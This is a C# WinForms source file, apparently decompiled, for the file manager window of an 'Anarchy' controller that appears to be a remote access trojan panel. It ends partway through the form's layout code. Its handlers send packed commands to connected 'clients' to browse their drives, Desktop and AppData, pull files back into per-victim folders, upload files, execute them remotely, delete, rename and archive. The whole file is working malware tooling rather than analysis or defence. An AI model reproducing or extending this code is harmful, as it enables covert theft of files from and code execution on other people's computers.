using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Anarchy.Auth;
using Anarchy.Helpers.MessagePack;
using Anarchy.Networking;
using Anarchy.Properties;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic;
using ReaLTaiizor.Forms;

namespace Anarchy.Forms;

public class FormFileManager : Form
{
    private IContainer components;

    public ListView listView1;

    public ImageList imageList1;

    public StatusStrip statusStrip1;

    public ToolStripStatusLabel toolStripStatusLabel1;

    public ToolStripStatusLabel toolStripStatusLabel2;

    public ToolStripStatusLabel toolStripStatusLabel3;

    public System.Windows.Forms.Timer timer1;

    private ColumnHeader columnHeader1;

    private ColumnHeader columnHeader2;

    private HopeForm hopeForm1;

    private ReaLTaiizor.Controls.Panel panel1;

    private Guna2Elipse guna2Elipse1;

    private Guna2ContextMenuStrip contextMenuStrip1;

    private ToolStripMenuItem rEFRESHToolStripMenuItem;

    private ToolStripMenuItem createFolderToolStripMenuItem;

    private ToolStripMenuItem toolStripMenuItem1;

    private ToolStripMenuItem toolStripMenuItem5;

    private ToolStripMenuItem toolStripMenuItem6;

    private ToolStripMenuItem toolStripMenuItem7;

    private ToolStripMenuItem toolStripMenuItem8;

    private ToolStripMenuItem toolStripMenuItem9;

    private ToolStripMenuItem toolStripMenuItem10;

    private ToolStripMenuItem toolStripMenuItem11;

    private ToolStripMenuItem toolStripMenuItem12;

    private ToolStripMenuItem toolStripMenuItem13;

    private ToolStripMenuItem toolStripMenuItem14;

    private ToolStripMenuItem toolStripMenuItem15;

    private ToolStripMenuItem toolStripMenuItem16;

    private ToolStripMenuItem toolStripMenuItem17;

    private ToolStripMenuItem toolStripMenuItem18;

    private ToolStripMenuItem toolStripMenuItem19;

    private ToolStripMenuItem toolStripMenuItem20;

    private ToolStripMenuItem openClientFolderToolStripMenuItem;

    private Guna2Button guna2Button1;

    private Guna2Button guna2Button6;

    public Form1 F { get; set; }

    internal Clients Client { get; set; }

    public string FullPath { get; set; }

    public FormFileManager()
    {
        this.InitializeComponent();
    }

    private void listView1_DoubleClick(object sender, EventArgs e)
    {
        try
        {
            if (this.listView1.SelectedItems.Count == 1)
            {
                MsgPack msgPack;
                msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
                msgPack.ForcePathObject("Command").AsString = "getPath";
                msgPack.ForcePathObject("Path").AsString = this.listView1.SelectedItems[0].ToolTipText;
                this.listView1.Enabled = false;
                this.toolStripStatusLabel3.ForeColor = Color.Green;
                this.toolStripStatusLabel3.Text = "Please Wait";
                ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
            }
        }
        catch
        {
        }
    }

    private void backToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack;
            msgPack = new MsgPack();
            string text;
            text = this.toolStripStatusLabel1.Text;
            if (text.Length <= 3)
            {
                msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
                msgPack.ForcePathObject("Command").AsString = "getDrivers";
                this.toolStripStatusLabel1.Text = "";
                ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
            }
            else
            {
                text = text.Remove(text.LastIndexOfAny(new char[1] { '\\' }, text.LastIndexOf('\\')));
                msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
                msgPack.ForcePathObject("Command").AsString = "getPath";
                msgPack.ForcePathObject("Path").AsString = text + "\\";
                ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
            }
        }
        catch
        {
            MsgPack msgPack2;
            msgPack2 = new MsgPack();
            msgPack2.ForcePathObject("Pac_ket").AsString = "fileManager";
            msgPack2.ForcePathObject("Command").AsString = "getDrivers";
            this.toolStripStatusLabel1.Text = "";
            ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack2.Encode2Bytes());
        }
    }

    private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            if (this.listView1.SelectedItems.Count <= 0)
            {
                return;
            }
            if (!Directory.Exists(Path.Combine(Application.StartupPath, "ClientsFolder\\" + this.Client.ID)))
            {
                Directory.CreateDirectory(Path.Combine(Application.StartupPath, "ClientsFolder\\" + this.Client.ID));
            }
            foreach (ListViewItem selectedItem in this.listView1.SelectedItems)
            {
                if (selectedItem.ImageIndex == 0 && selectedItem.ImageIndex == 1 && selectedItem.ImageIndex == 2)
                {
                    break;
                }
                MsgPack msgPack;
                msgPack = new MsgPack();
                string dwid;
                dwid = Guid.NewGuid().ToString();
                msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
                msgPack.ForcePathObject("Command").AsString = "socketDownload";
                msgPack.ForcePathObject("File").AsString = selectedItem.ToolTipText;
                msgPack.ForcePathObject("DWID").AsString = dwid;
                ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
                base.BeginInvoke((MethodInvoker)delegate
                {
                    if ((FormDownloadFile)Application.OpenForms["socketDownload:" + dwid] == null)
                    {
                        FormDownloadFile formDownloadFile;
                        formDownloadFile = new FormDownloadFile();
                        formDownloadFile.Name = "socketDownload:" + dwid;
                        formDownloadFile.Text = "socketDownload:" + this.Client.ID;
                        formDownloadFile.F = this.F;
                        formDownloadFile.DirPath = this.FullPath;
                        formDownloadFile.Show();
                    }
                });
            }
        }
        catch
        {
        }
    }

    private void uPLOADToolStripMenuItem_Click(object sender, EventArgs e)
    {
        if (this.toolStripStatusLabel1.Text.Length < 3)
        {
            return;
        }
        try
        {
            OpenFileDialog openFileDialog;
            openFileDialog = new OpenFileDialog();
            openFileDialog.Multiselect = true;
            if (openFileDialog.ShowDialog() != DialogResult.OK)
            {
                return;
            }
            string[] fileNames;
            fileNames = openFileDialog.FileNames;
            foreach (string text in fileNames)
            {
                if ((FormDownloadFile)Application.OpenForms["socketDownload:"] == null)
                {
                    FormDownloadFile formDownloadFile;
                    formDownloadFile = new FormDownloadFile
                    {
                        Name = "socketUpload:" + Guid.NewGuid().ToString(),
                        Text = "socketUpload:" + this.Client.ID,
                        F = Login.form1,
                        Client = this.Client
                    };
                    formDownloadFile.FileSize = new System.IO.FileInfo(text).Length;
                    formDownloadFile.labelfile.Text = Path.GetFileName(text);
                    formDownloadFile.FullFileName = text;
                    formDownloadFile.label1.Text = "Upload:";
                    formDownloadFile.ClientFullFileName = this.toolStripStatusLabel1.Text + "\\" + Path.GetFileName(text);
                    MsgPack msgPack;
                    msgPack = new MsgPack();
                    msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
                    msgPack.ForcePathObject("Command").AsString = "reqUploadFile";
                    msgPack.ForcePathObject("ID").AsString = formDownloadFile.Name;
                    formDownloadFile.Show();
                    ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
                }
            }
        }
        catch
        {
        }
    }

    private void dELETEToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            if (this.listView1.SelectedItems.Count <= 0)
            {
                return;
            }
            foreach (ListViewItem selectedItem in this.listView1.SelectedItems)
            {
                if (selectedItem.ImageIndex != 0 && selectedItem.ImageIndex != 1 && selectedItem.ImageIndex != 2)
                {
                    MsgPack msgPack;
                    msgPack = new MsgPack();
                    msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
                    msgPack.ForcePathObject("Command").AsString = "deleteFile";
                    msgPack.ForcePathObject("File").AsString = selectedItem.ToolTipText;
                    ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
                }
                else if (selectedItem.ImageIndex == 0)
                {
                    MsgPack msgPack2;
                    msgPack2 = new MsgPack();
                    msgPack2.ForcePathObject("Pac_ket").AsString = "fileManager";
                    msgPack2.ForcePathObject("Command").AsString = "deleteFolder";
                    msgPack2.ForcePathObject("Folder").AsString = selectedItem.ToolTipText;
                    ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack2.Encode2Bytes());
                }
            }
        }
        catch
        {
        }
    }

    private void rEFRESHToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            if (this.toolStripStatusLabel1.Text != "")
            {
                MsgPack msgPack;
                msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
                msgPack.ForcePathObject("Command").AsString = "getPath";
                msgPack.ForcePathObject("Path").AsString = this.toolStripStatusLabel1.Text;
                ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
            }
            else
            {
                MsgPack msgPack2;
                msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Pac_ket").AsString = "fileManager";
                msgPack2.ForcePathObject("Command").AsString = "getDrivers";
                ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack2.Encode2Bytes());
            }
        }
        catch
        {
        }
    }

    private void eXECUTEToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            if (this.listView1.SelectedItems.Count <= 0)
            {
                return;
            }
            foreach (ListViewItem selectedItem in this.listView1.SelectedItems)
            {
                MsgPack msgPack;
                msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
                msgPack.ForcePathObject("Command").AsString = "execute";
                msgPack.ForcePathObject("File").AsString = selectedItem.ToolTipText;
                ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
            }
        }
        catch
        {
        }
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
        try
        {
            if (!this.Client.TcpClient.Connected)
            {
                base.Close();
            }
        }
        catch
        {
            base.Close();
        }
    }

    private void DESKTOPToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
            msgPack.ForcePathObject("Command").AsString = "getPath";
            msgPack.ForcePathObject("Path").AsString = "DESKTOP";
            ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
        }
        catch
        {
        }
    }

    private void APPDATAToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
            msgPack.ForcePathObject("Command").AsString = "getPath";
            msgPack.ForcePathObject("Path").AsString = "APPDATA";
            ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
        }
        catch
        {
        }
    }

    private void CreateFolderToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            string text;
            text = Interaction.InputBox("Create Folder", "Name", Path.GetRandomFileName().Replace(".", ""));
            if (!string.IsNullOrEmpty(text))
            {
                MsgPack msgPack;
                msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
                msgPack.ForcePathObject("Command").AsString = "createFolder";
                msgPack.ForcePathObject("Folder").AsString = Path.Combine(this.toolStripStatusLabel1.Text, text);
                ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
            }
        }
        catch
        {
        }
    }

    private void CopyToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            if (this.listView1.SelectedItems.Count <= 0)
            {
                return;
            }
            StringBuilder stringBuilder;
            stringBuilder = new StringBuilder();
            foreach (ListViewItem selectedItem in this.listView1.SelectedItems)
            {
                stringBuilder.Append(selectedItem.ToolTipText + "-=>");
            }
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
            msgPack.ForcePathObject("Command").AsString = "copyFile";
            msgPack.ForcePathObject("File").AsString = stringBuilder.ToString();
            msgPack.ForcePathObject("IO").AsString = "copy";
            ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
        }
        catch
        {
        }
    }

    private void PasteToolStripMenuItem_Click_1(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
            msgPack.ForcePathObject("Command").AsString = "pasteFile";
            msgPack.ForcePathObject("File").AsString = this.toolStripStatusLabel1.Text;
            ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
        }
        catch
        {
        }
    }

    private void RenameToolStripMenuItem_Click(object sender, EventArgs e)
    {
        if (this.listView1.SelectedItems.Count != 1)
        {
            return;
        }
        try
        {
            string text;
            text = Interaction.InputBox("Rename File or Folder", "Name", this.listView1.SelectedItems[0].Text);
            if (!string.IsNullOrEmpty(text))
            {
                if (this.listView1.SelectedItems[0].ImageIndex != 0 && this.listView1.SelectedItems[0].ImageIndex != 1 && this.listView1.SelectedItems[0].ImageIndex != 2)
                {
                    MsgPack msgPack;
                    msgPack = new MsgPack();
                    msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
                    msgPack.ForcePathObject("Command").AsString = "renameFile";
                    msgPack.ForcePathObject("File").AsString = this.listView1.SelectedItems[0].ToolTipText;
                    msgPack.ForcePathObject("NewName").AsString = Path.Combine(this.toolStripStatusLabel1.Text, text);
                    ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
                }
                else if (this.listView1.SelectedItems[0].ImageIndex == 0)
                {
                    MsgPack msgPack2;
                    msgPack2 = new MsgPack();
                    msgPack2.ForcePathObject("Pac_ket").AsString = "fileManager";
                    msgPack2.ForcePathObject("Command").AsString = "renameFolder";
                    msgPack2.ForcePathObject("Folder").AsString = this.listView1.SelectedItems[0].ToolTipText + "\\";
                    msgPack2.ForcePathObject("NewName").AsString = Path.Combine(this.toolStripStatusLabel1.Text, text);
                    ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack2.Encode2Bytes());
                }
            }
        }
        catch
        {
        }
    }

    private void UserProfileToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
            msgPack.ForcePathObject("Command").AsString = "getPath";
            msgPack.ForcePathObject("Path").AsString = "USER";
            ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
        }
        catch
        {
        }
    }

    private void DriversListsToolStripMenuItem_Click(object sender, EventArgs e)
    {
        MsgPack msgPack;
        msgPack = new MsgPack();
        msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
        msgPack.ForcePathObject("Command").AsString = "getDrivers";
        this.toolStripStatusLabel1.Text = "";
        ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
    }

    private void OpenClientFolderToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            if (!Directory.Exists(this.FullPath))
            {
                Directory.CreateDirectory(this.FullPath);
            }
            Process.Start(this.FullPath);
        }
        catch
        {
        }
    }

    private void FormFileManager_FormClosed(object sender, FormClosedEventArgs e)
    {
        ThreadPool.QueueUserWorkItem(delegate
        {
            this.Client?.Disconnected();
        });
    }

    private void CutToolStripMenuItem1_Click(object sender, EventArgs e)
    {
        try
        {
            if (this.listView1.SelectedItems.Count <= 0)
            {
                return;
            }
            StringBuilder stringBuilder;
            stringBuilder = new StringBuilder();
            foreach (ListViewItem selectedItem in this.listView1.SelectedItems)
            {
                stringBuilder.Append(selectedItem.ToolTipText + "-=>");
            }
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
            msgPack.ForcePathObject("Command").AsString = "copyFile";
            msgPack.ForcePathObject("File").AsString = stringBuilder.ToString();
            msgPack.ForcePathObject("IO").AsString = "cut";
            ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
        }
        catch
        {
        }
    }

    private void ZipToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            if (this.listView1.SelectedItems.Count <= 0)
            {
                return;
            }
            StringBuilder stringBuilder;
            stringBuilder = new StringBuilder();
            foreach (ListViewItem selectedItem in this.listView1.SelectedItems)
            {
                stringBuilder.Append(selectedItem.ToolTipText + "-=>");
            }
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
            msgPack.ForcePathObject("Command").AsString = "zip";
            msgPack.ForcePathObject("Path").AsString = stringBuilder.ToString();
            msgPack.ForcePathObject("Zip").AsString = "true";
            ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
        }
        catch
        {
        }
    }

    private void UnzipToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            if (this.listView1.SelectedItems.Count <= 0)
            {
                return;
            }
            foreach (ListViewItem selectedItem in this.listView1.SelectedItems)
            {
                MsgPack msgPack;
                msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
                msgPack.ForcePathObject("Command").AsString = "zip";
                msgPack.ForcePathObject("Path").AsString = selectedItem.ToolTipText;
                msgPack.ForcePathObject("Zip").AsString = "false";
                ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
            }
        }
        catch
        {
        }
    }

    private void InstallToolStripMenuItem_Click(object sender, EventArgs e)
    {
        MsgPack msgPack;
        msgPack = new MsgPack();
        msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
        msgPack.ForcePathObject("Command").AsString = "installZip";
        msgPack.ForcePathObject("exe").SetAsBytes(Resources._7z);
        msgPack.ForcePathObject("dll").SetAsBytes(Resources._7z1);
        ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
    }

    private void FormFileManager_Load(object sender, EventArgs e)
    {
    }

    private void hopeForm1_Click(object sender, EventArgs e)
    {
    }

    protected override void Dispose(bool disposing)
    {
        if (disposing && this.components != null)
        {
            this.components.Dispose();
        }
        base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
        this.components = new System.ComponentModel.Container();
        System.Windows.Forms.ListViewGroup listViewGroup;
        listViewGroup = new System.Windows.Forms.ListViewGroup("Folders", System.Windows.Forms.HorizontalAlignment.Left);
        System.Windows.Forms.ListViewGroup listViewGroup2;
        listViewGroup2 = new System.Windows.Forms.ListViewGroup("File", System.Windows.Forms.HorizontalAlignment.Left);
        
        System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FormFileManager));
        this.listView1 = new System.Windows.Forms.ListView();
        this.columnHeader1 = new System.Windows.Forms.ColumnHeader();
        this.columnHeader2 = new System.Windows.Forms.ColumnHeader();
        this.contextMenuStrip1 = new Guna.UI2.WinForms.Guna2ContextMenuStrip();
        this.rEFRESHToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.createFolderToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.toolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
        this.toolStripMenuItem5 = new System.Windows.Forms.ToolStripMenuItem();
        this.toolStripMenuItem6 = new System.Windows.Forms.ToolStripMenuItem();
        this.toolStripMenuItem7 = new System.Windows.Forms.ToolStripMenuItem();
        this.toolStripMenuItem8 = new System.Windows.Forms.ToolStripMenuItem();
        this.toolStripMenuItem9 = new System.Windows.Forms.ToolStripMenuItem();
        this.toolStripMenuItem10 = new System.Windows.Forms.ToolStripMenuItem();
        this.toolStripMenuItem11 = new System.Windows.Forms.ToolStripMenuItem();
        this.toolStripMenuItem12 = new System.Windows.Forms.ToolStripMenuItem();
        this.toolStripMenuItem13 = new System.Windows.Forms.ToolStripMenuItem();
        this.toolStripMenuItem14 = new System.Windows.Forms.ToolStripMenuItem();
        this.toolStripMenuItem15 = new System.Windows.Forms.ToolStripMenuItem();
        this.toolStripMenuItem16 = new System.Windows.Forms.ToolStripMenuItem();
        this.toolStripMenuItem17 = new System.Windows.Forms.ToolStripMenuItem();
        this.toolStripMenuItem18 = new System.Windows.Forms.ToolStripMenuItem();
        this.toolStripMenuItem19 = new System.Windows.Forms.ToolStripMenuItem();
        this.toolStripMenuItem20 = new System.Windows.Forms.ToolStripMenuItem();
        this.openClientFolderToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.imageList1 = new System.Windows.Forms.ImageList(this.components);
        this.statusStrip1 = new System.Windows.Forms.StatusStrip();
        this.toolStripStatusLabel1 = new System.Windows.Forms.ToolStripStatusLabel();
        this.toolStripStatusLabel2 = new System.Windows.Forms.ToolStripStatusLabel();
        this.toolStripStatusLabel3 = new System.Windows.Forms.ToolStripStatusLabel();
        this.timer1 = new System.Windows.Forms.Timer(this.components);
        this.hopeForm1 = new ReaLTaiizor.Forms.HopeForm();
        this.panel1 = new ReaLTaiizor.Controls.Panel();
        this.guna2Elipse1 = new Guna.UI2.WinForms.Guna2Elipse(this.components);
        this.guna2Button6 = new Guna.UI2.WinForms.Guna2Button();
        this.guna2Button1 = new Guna.UI2.WinForms.Guna2Button();
        this.contextMenuStrip1.SuspendLayout();
        this.statusStrip1.SuspendLayout();
        this.panel1.SuspendLayout();
        base.SuspendLayout();
        this.listView1.AllowColumnReorder = true;
        this.listView1.BackColor = System.Drawing.Color.FromArgb(30, 32, 37);
        this.listView1.BorderStyle = System.Windows.Forms.BorderStyle.None;
        this.listView1.Columns.AddRange(new System.Windows.Forms.ColumnHeader[2] { this.columnHeader1, this.columnHeader2 });
        this.listView1.ContextMenuStrip = this.contextMenuStrip1;
        this.listView1.Dock = System.Windows.Forms.DockStyle.Fill;
        this.listView1.ForeColor = System.Drawing.Color.White;
        listViewGroup.Header = "Folders";
        listViewGroup.Name = "Folders";
        listViewGroup2.Header = "File";
        listViewGroup2.Name = "File";
        this.listView1.Groups.AddRange(new System.Windows.Forms.ListViewGroup[2] { listViewGroup, listViewGroup2 });
        this.listView1.HideSelection = false;
        this.listView1.LargeImageList = this.imageList1;
        this.listView1.Location = new System.Drawing.Point(0, 69);
        this.listView1.Margin = new System.Windows.Forms.Padding(2);
        this.listView1.Name = "listView1";
        this.listView1.ShowItemToolTips = true;
        this.listView1.Size = new System.Drawing.Size(849, 378);
        this.listView1.SmallImageList = this.imageList1;
        this.listView1.TabIndex = 0;
        this.listView1.UseCompatibleStateImageBehavior = false;
        this.listView1.View = System.Windows.Forms.View.Tile;
        this.listView1.DoubleClick += new System.EventHandler(listView1_DoubleClick);
        this.contextMenuStrip1.BackColor = System.Drawing.Color.FromArgb(30, 32, 37);
        this.contextMenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[13]
        {
            this.rEFRESHToolStripMenuItem, this.createFolderToolStripMenuItem, this.toolStripMenuItem1, this.toolStripMenuItem5, this.toolStripMenuItem6, this.toolStripMenuItem7, this.toolStripMenuItem8, this.toolStripMenuItem9, this.toolStripMenuItem10, this.toolStripMenuItem11,
            this.toolStripMenuItem12, this.toolStripMenuItem16, this.openClientFolderToolStripMenuItem
        });
        this.contextMenuStrip1.Name = "guna2ContextMenuStrip1";
        this.contextMenuStrip1.RenderStyle.ArrowColor = System.Drawing.Color.Fuchsia;
        this.contextMenuStrip1.RenderStyle.BorderColor = System.Drawing.Color.FromArgb(30, 32, 37);
        this.contextMenuStrip1.RenderStyle.ColorTable = null;
        this.contextMenuStrip1.RenderStyle.RoundedEdges = true;
        this.contextMenuStrip1.RenderStyle.SelectionArrowColor = System.Drawing.Color.White;
        this.contextMenuStrip1.RenderStyle.SelectionBackColor = System.Drawing.Color.FromArgb(224, 224, 224);
        this.contextMenuStrip1.RenderStyle.SelectionForeColor = System.Drawing.Color.White;
        this.contextMenuStrip1.RenderStyle.SeparatorColor = System.Drawing.Color.Gainsboro;
        this.contextMenuStrip1.RenderStyle.TextRenderingHint = System.Drawing.Text.TextRenderingHint.ClearTypeGridFit;
        this.contextMenuStrip1.Size = new System.Drawing.Size(140, 290);
        this.rEFRESHToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(224, 224, 224);
        this.rEFRESHToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("rEFRESHToolStripMenuItem.Image");
        this.rEFRESHToolStripMenuItem.Name = "rEFRESHToolStripMenuItem";
        this.rEFRESHToolStripMenuItem.Size = new System.Drawing.Size(139, 22);
        this.rEFRESHToolStripMenuItem.Text = "Refresh";
        this.rEFRESHToolStripMenuItem.Click += new System.EventHandler(rEFRESHToolStripMenuItem_Click);
        this.createFolderToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(224, 224, 224);
        this.createFolderToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("createFolderToolStripMenuItem.Image");
        this.createFolderToolStripMenuItem.Name = "createFolderToolStripMenuItem";
        this.createFolderToolStripMenuItem.Size = new System.Drawing.Size(139, 22);
        this.createFolderToolStripMenuItem.Text = "New Folder";
        this.createFolderToolStripMenuItem.Click += new System.EventHandler(CreateFolderToolStripMenuItem_Click);
        this.toolStripMenuItem1.ForeColor = System.Drawing.Color.FromArgb(224, 224, 224);
        this.toolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem1.Image");
        this.toolStripMenuItem1.Name = "toolStripMenuItem1";
        this.toolStripMenuItem1.Size = new System.Drawing.Size(139, 22);
        this.toolStripMenuItem1.Text = "Download";
        this.toolStripMenuItem1.Click += new System.EventHandler(downloadToolStripMenuItem_Click);
        this.toolStripMenuItem5.ForeColor = System.Drawing.Color.FromArgb(224, 224, 224);
        this.toolStripMenuItem5.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem5.Image");
        this.toolStripMenuItem5.Name = "toolStripMenuItem5";
        this.toolStripMenuItem5.Size = new System.Drawing.Size(139, 22);
        this.toolStripMenuItem5.Text = "Upload";
        this.toolStripMenuItem5.Click += new System.EventHandler(uPLOADToolStripMenuItem_Click);
        this.toolStripMenuItem6.ForeColor = System.Drawing.Color.FromArgb(224, 224, 224);
        this.toolStripMenuItem6.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem6.Image");
        this.toolStripMenuItem6.Name = "toolStripMenuItem6";
        this.toolStripMenuItem6.Size = new System.Drawing.Size(139, 22);
        this.toolStripMenuItem6.Text = "Execute";
        this.toolStripMenuItem6.Click += new System.EventHandler(eXECUTEToolStripMenuItem_Click);
        this.toolStripMenuItem7.ForeColor = System.Drawing.Color.FromArgb(224, 224, 224);
        this.toolStripMenuItem7.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem7.Image");
        this.toolStripMenuItem7.Name = "toolStripMenuItem7";
        this.toolStripMenuItem7.Size = new System.Drawing.Size(139, 22);
        this.toolStripMenuItem7.Text = "Rename";
        this.toolStripMenuItem7.Click += new System.EventHandler(RenameToolStripMenuItem_Click);
        this.toolStripMenuItem8.ForeColor = System.Drawing.Color.FromArgb(224, 224, 224);
        this.toolStripMenuItem8.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem8.Image");
        this.toolStripMenuItem8.Name = "toolStripMenuItem8";
        this.toolStripMenuItem8.Size = new System.Drawing.Size(139, 22);
        this.toolStripMenuItem8.Text = "Copy";
        this.toolStripMenuItem8.Click += new System.EventHandler(CopyToolStripMenuItem_Click);
        this.toolStripMenuItem9.ForeColor = System.Drawing.Color.FromArgb(224, 224, 224);
        this.toolStripMenuItem9.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem9.Image");
        this.toolStripMenuItem9.Name = "toolStripMenuItem9";
        this.toolStripMenuItem9.Size = new System.Drawing.Size(139, 22);
        this.toolStripMenuItem9.Text = "Cut";
        this.toolStripMenuItem9.Click += new System.EventHandler(CutToolStripMenuItem1_Click);
        this.toolStripMenuItem10.ForeColor = System.Drawing.Color.FromArgb(224, 224, 224);
        this.toolStripMenuItem10.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem10.Image");
        this.toolStripMenuItem10.Name = "toolStripMenuItem10";
        this.toolStripMenuItem10.Size = new System.Drawing.Size(139, 22);
        this.toolStripMenuItem10.Text = "Paste";
        this.toolStripMenuItem10.Click += new System.EventHandler(PasteToolStripMenuItem_Click_1);
        this.toolStripMenuItem11.ForeColor = System.Drawing.Color.FromArgb(224, 224, 224);
        this.toolStripMenuItem11.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem11.Image");
        this.toolStripMenuItem11.Name = "toolStripMenuItem11";
        this.toolStripMenuItem11.Size = new System.Drawing.Size(139, 22);
        this.toolStripMenuItem11.Text = "Delete";
        this.toolStripMenuItem11.Click += new System.EventHandler(dELETEToolStripMenuItem_Click);
        this.toolStripMenuItem12.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[3] { this.toolStripMenuItem13, this.toolStripMenuItem14, this.toolStripMenuItem15 });
        this.toolStripMenuItem12.ForeColor = System.Drawing.Color.FromArgb(224, 224, 224);
        this.toolStripMenuItem12.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem12.Image");
        this.toolStripMenuItem12.Name = "toolStripMenuItem12";
        this.toolStripMenuItem12.Size = new System.Drawing.Size(139, 22);
        this.toolStripMenuItem12.Text = "7-Zip";
        this.toolStripMenuItem12.Visible = false;
        this.toolStripMenuItem13.BackColor = System.Drawing.Color.FromArgb(30, 32, 37);
        this.toolStripMenuItem13.ForeColor = System.Drawing.Color.FromArgb(224, 224, 224);
        this.toolStripMenuItem13.Name = "toolStripMenuItem13";
        this.toolStripMenuItem13.Size = new System.Drawing.Size(180, 22);
        this.toolStripMenuItem13.Text = "Install";
        this.toolStripMenuItem14.BackColor = System.Drawing.Color.FromArgb(30, 32, 37);
        this.toolStripMenuItem14.ForeColor = System.Drawing.Color.FromArgb(224, 224, 224);
        this.toolStripMenuItem14.Name = "toolStripMenuItem14";
        this.toolStripMenuItem14.Size = new System.Drawing.Size(180, 22);
        this.toolStripMenuItem14.Text = "Zip";
        this.toolStripMenuItem15.BackColor = System.Drawing.Color.FromArgb(30, 32, 37);
        this.toolStripMenuItem15.ForeColor = System.Drawing.Color.FromArgb(224, 224, 224);
